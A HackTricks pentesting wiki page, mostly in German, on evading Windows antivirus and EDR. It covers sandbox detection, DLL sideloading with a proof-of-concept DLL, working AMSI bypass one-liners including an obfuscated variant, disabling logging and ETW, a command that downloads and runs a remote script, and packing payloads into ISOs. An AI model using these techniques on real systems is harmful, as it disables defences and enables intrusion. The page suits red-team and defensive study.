# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Betrieb zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender außer Betrieb zu setzen, indem ein anderes AV vorgetäuscht wird.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei fortgeschritteneren EDRs auch behavioural analysis.

### **Static detection**

Static detection funktioniert, indem bekannte bösartige Strings oder Byte-Arrays in einer Binary oder einem Script markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digital signatures, icon, checksum, etc.). Das bedeutet, dass die Nutzung bekannter öffentlicher Tools dazu führen kann, dass man eher entdeckt wird, da diese Tools wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Wege, um diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du die Binary verschlüsselst, hat das AV keine Möglichkeit, dein Programm zu erkennen, aber du benötigst dann einen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es, einige Strings in deiner Binary oder deinem Script zu ändern, um am AV vorbeizukommen, aber das kann je nach Umfang der gewünschten Obfuskation zeitaufwändig sein.

- **Custom tooling**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis ist, wenn das AV deine Binary in einer Sandbox ausführt und nach bösartigem Verhalten sucht (z. B. das Versuchen, Browser-Passwörter zu entschlüsseln und zu lesen, einen minidump von LSASS zu erstellen, etc.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Abhängig von der Implementierung kann ein Sleep vor der Ausführung eine gute Möglichkeit sein, dynamic analysis von AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Workflow des Nutzers nicht zu unterbrechen, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele AV-Sandboxes Sleep-Aufrufe je nach Implementierung einfach überspringen können.
- **Checking machine's resources** Üblicherweise haben Sandboxes sehr wenig Ressourcen (z. B. < 2GB RAM), sonst könnten sie den Rechner des Nutzers verlangsamen. Hier kann man auch sehr kreativ werden, z. B. durch Abfragen der CPU-Temperatur oder sogar der Lüfterdrehzahlen — nicht alles wird in der Sandbox implementiert sein.
- **Machine-specific checks** Wenn du einen User targeten willst, dessen Workstation in der Domain "contoso.local" ist, kannst du die Domain des Rechners prüfen; wenn sie nicht übereinstimmt, kann dein Programm einfach beenden.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH ist. Du kannst also vor der Detonation in deiner Malware nach dem Computernamen prüfen; wenn der Name HAL9TH ist, befindest du dich in Defender's Sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev Kanal</p></figcaption></figure>

Wie bereits erwähnt, werden **public tools** früher oder später **entdeckt**, also solltest du dir folgende Frage stellen:

Wenn du z. B. LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt nutzen, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Mimikatz ist wahrscheinlich eines der, wenn nicht das am meisten von AVs und EDRs markierte Tool; obwohl das Projekt an sich super ist, ist es ein Albtraum, wenn es darum geht, AVs zu umgehen. Such also Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, stelle sicher, dass du die automatische Sample-Submission in Defender ausschaltest, und bitte, ernsthaft, **DO NOT UPLOAD TO VIRUSTOTAL**, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere dieses auf einer VM, versuche die automatische Sample-Submission abzuschalten und teste dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Immer wenn möglich, **priorisiere die Verwendung von DLLs für Evasion**. Nach meiner Erfahrung werden DLL-Dateien in der Regel **viel seltener erkannt** und analysiert, daher ist es ein sehr einfacher Trick, um in manchen Fällen die Erkennung zu umgehen (vorausgesetzt, deine Payload kann als DLL ausgeführt werden).

Wie wir in diesem Bild sehen, hat ein DLL-Payload von Havoc eine Detection-Rate von 4/26 in antiscan.me, während der EXE-Payload eine Detection-Rate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die victim application und die malicious payload(s) nebeneinander positioniert werden.

Du kannst Programme, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL Hijacking im Verzeichnis "C:\Program Files\\" anfällig sind, und die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst erkundest**, diese Technik ist ziemlich unauffällig, wenn sie richtig angewendet wird, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Nur dadurch, eine bösartige DLL mit dem Namen abzulegen, den ein Programm zu laden erwartet, wird dein payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet; um dieses Problem zu lösen, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm von der Proxy (und bösartigen) DLL macht, an die Original-DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und du die Ausführung deines payloads handhaben kannst.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project von [@flangvik](https://twitter.com/Flangvik/)

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl wird uns 2 Dateien liefern: eine DLL-Quellcodevorlage und die ursprüngliche, umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr von dem, was wir besprochen haben, tiefergehend zu lernen.

### Missbrauch von Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Lädt `TargetDll`, wenn es nicht bereits geladen ist
- Löst `TargetFunc` daraus auf

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z.B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, welche das Verzeichnis des Moduls beinhaltet, das die Forward-Auflösung durchführt.

Das ermöglicht eine indirekte sideloading-Primitive: Finde eine signed DLL, die eine Funktion exportiert, die zu einem non-KnownDLL-Modulnamen weitergeleitet ist, und platziere diese signed DLL im selben Verzeichnis wie eine attacker-controlled DLL, die genau den Namen des weitergeleiteten Zielmoduls trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Forward auf und lädt deine DLL aus demselben Verzeichnis, wodurch deine DllMain ausgeführt wird.

Beispiel beobachtet auf Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (Kopieren/Einfügen):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Platziere eine bösartige `NCRYPTPROV.dll` im selben Ordner. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Löse die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die side-by-side `keyiso.dll` (signiert)
- Während der Auflösung von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhalten Sie erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hinweise zur Erkennung:
- Konzentrieren Sie sich auf weitergeleitete Exports, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Sie können weitergeleitete Exports mit Tools wie:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Abwehrideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden
- Durchsetzen von Code-Integritätsrichtlinien (WDAC/AppLocker) und Verweigern von write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs unter Verwendung suspendierter Prozesse, direkter syscalls und alternativer Ausführungsmethoden`

Du kannst Freeze verwenden, um deinen shellcode unauffällig zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Umgehung ist nur ein Katz- und Mausspiel — was heute funktioniert, kann morgen entdeckt werden. Verlasse dich niemals ausschließlich auf ein Tool; wenn möglich, kombiniere mehrere Umgehungstechniken.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen, sodass Payloads, die **direkt im Speicher (in-memory)** ausgeführt wurden, vom AV nicht erkannt werden konnten, da die Sichtbarkeit fehlte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Sie erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer Form offengelegt werden, die weder verschlüsselt noch obfuskiert ist.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und anschließend den Pfad zur ausführenden Datei angibt — in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher (in-memory) durch AMSI erkannt.

Außerdem werden ab **.NET 4.8** auch C#-Programme durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])` für in-memory execution. Deshalb wird empfohlen, für In-Memory-Ausführung niedrigere .NET-Versionen (z. B. 4.7.2 oder älter) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt mehrere Wege, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die man laden will, eine gute Methode sein, um einer Erkennung zu entgehen.

Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst wenn mehrere Schichten angewendet wurden, sodass Obfuskation je nach Umsetzung eine schlechte Option sein kann. Das macht das Umgehen nicht immer trivial. Manchmal reicht es jedoch, ein paar Variablennamen zu ändern, sodass es darauf ankommt, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell-Prozess (ebenfalls cscript.exe, wscript.exe usw.) implementiert ist, lässt es sich selbst als unprivilegierter Benutzer relativ einfach manipulieren. Aufgrund dieser Implementierungsschwäche haben Forscher mehrere Wege gefunden, AMSI-Scanning zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlschlags der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) öffentlich gemacht, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was nötig war, war eine einzige Zeile powershell code, um AMSI für den aktuellen powershell process unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Modifikation nötig, um diese Technik verwenden zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird, daher solltest du keinen Code veröffentlichen, wenn dein Plan ist, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (zuständig für das Scannen der vom Benutzer bereitgestellten Eingabe) zu finden und sie mit Anweisungen zu überschreiben, die den Code E_INVALIDARG zurückgeben. Auf diese Weise liefert das eigentliche Scan-Ergebnis 0, was als sauber interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.

Es gibt außerdem viele weitere Techniken, um AMSI mit powershell zu umgehen, siehe [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), um mehr darüber zu erfahren.

Dieses Tool [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) erzeugt außerdem Skripte, um AMSI zu umgehen.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool arbeitet, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und sie dann mit NOP-Anweisungen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Powershell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies so tun:
```bash
powershell.exe -version 2
```
## PS-Protokollierung

PowerShell logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann nützlich für Überprüfungen und Fehlerbehebung sein, aber es kann auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um die PowerShell-Protokollierung zu umgehen, können Sie die folgenden Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Dafür können Sie ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Das geht z.B.: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine unmanaged PowerShell-Session ohne Schutzmechanismen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuskation

> [!TIP]
> Einige Obfuskationstechniken beruhen auf der Verschlüsselung von Daten, was die Entropie der Binärdatei erhöht und es AVs und EDRs erleichtert, sie zu erkennen. Seien Sie vorsichtig damit und verschlüsseln Sie gegebenenfalls nur bestimmte Abschnitte Ihres Codes, die sensibel sind oder verborgen werden müssen.

### Deobfuskation von ConfuserEx-geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der nachstehende Ablauf stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in Tools wie dnSpy oder ILSpy nach C# dekompiliert werden kann.

1.  Anti-Tampering-Entfernung – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *module* (`<Module>.cctor`). Dies patched außerdem die PE-Checksumme, sodass jede Modifikation das Binary zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadaten-Tabellen zu finden, die XOR-Schlüssel wiederherzustellen und ein sauberes Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol-/Control-Flow-Wiederherstellung – geben Sie die *clean*-Datei an **de4dot-cex** (ein ConfuserEx-kompatibler Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2 Profil  
• de4dot macht Control-Flow-Flattening rückgängig, stellt originale Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-Call-Entfernung – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (a.k.a *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` sehen anstelle von undurchsichtigen Wrapper-Funktionen (`Class8.smethod_10`, …).

4.  Manuelle Bereinigung – führen Sie das resultierende Binary in dnSpy aus, suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *eigentliche* Nutzlast zu finden. Oft speichert die Malware diese als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die oben beschriebene Kette stellt den Ausführungsfluss **wiederher**, ohne das bösartige Sample ausführen zu müssen – nützlich, wenn man an einem Offline-Arbeitsplatz arbeitet.

> 🛈 ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen open-source fork der [LLVM](http://www.llvm.org/) Compilation-Suite bereitzustellen, der erhöhte Software-Sicherheit durch code obfuscation und tamper-proofing bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die `C++11/14`-Sprache nutzt, um zur Compile-Zeit obfuscated code zu erzeugen, ohne ein externes Tool zu verwenden und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht von obfuscated operations hinzu, die vom C++ template metaprogramming framework generiert werden und das Leben der Person, die die Anwendung cracken möchte, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der verschiedene PE-Dateien obfuskieren kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist ein einfacher metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granuliertes code obfuscation framework für LLVM-supported languages, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf der Assembly-Ebene, indem es reguläre Instruktionen in ROP-Chains transformiert und damit unsere natürliche Vorstellung von normalem Kontrollfluss unterläuft.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Möglicherweise haben Sie diesen Bildschirm gesehen, wenn Sie ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der dazu dient, den Endanwender davor zu schützen, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen, wodurch der Endanwender gewarnt und daran gehindert wird, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig: Mit einem vertrauenswürdigen Signaturzertifikat signierte ausführbare Dateien lösen SmartScreen nicht aus.

Eine sehr effektive Methode, um zu verhindern, dass Ihre payloads die Mark of The Web erhalten, besteht darin, sie in einen Container wie eine ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf non NTFS volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Container verpackt, um Mark-of-the-Web zu umgehen.

Beispiel:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein mächtiger Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten erlaubt, Ereignisse zu **protokollieren**. Allerdings können Sicherheitsprodukte ETW auch nutzen, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (bypassed) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses so zu verändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Das geschieht, indem die Funktion im Speicher gepatcht wird, sodass ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Mehr Informationen finden Sie in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries in den Speicher ist schon lange bekannt und bleibt eine sehr gute Methode, um Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns hauptsächlich darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Wege, dies zu tun:

- **Fork\&Run**

